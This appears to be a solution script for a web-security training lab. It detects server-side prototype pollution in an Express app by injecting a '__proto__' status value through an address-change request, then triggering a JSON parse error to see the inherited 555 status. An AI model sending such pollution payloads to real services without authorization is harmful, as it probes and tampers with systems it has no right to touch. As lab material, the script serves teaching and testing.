import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession

lab = LabSession()

lab.login("wiener", "peter")

# no polluted property is reflected here, so we cannot read a gadget off the
# response. instead we detect pollution by a behavior change: the "status"
# property. Express reads it when building an error response.

# step 1: pollute Object.prototype.status with an unmistakable value
address = {
    "address_line_1": "Wiener HQ",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "sessionId": lab.session.cookies.get("session"),
    "__proto__": {"status": 555},
}
lab.info("Polluting Object.prototype.status = 555...")
lab.session.post(lab.url("/my-account/change-address"), json=address)

# step 2: force a parse error by sending malformed JSON. the error handler now
# reads the inherited status, returning 555 instead of the normal 500.
lab.info("Sending malformed JSON to trigger an error response...")
resp = lab.session.post(
    lab.url("/my-account/change-address"),
    data='{"address_line_1": "x" BROKEN',
    headers={"Content-Type": "application/json"},
)

lab.info(f"Error response status code: {resp.status_code}")
if resp.status_code == 555:
    lab.success("Got 555 - prototype pollution confirmed (status gadget)")
else:
    lab.warn(f"Expected 555, got {resp.status_code}")

lab.check_solved()
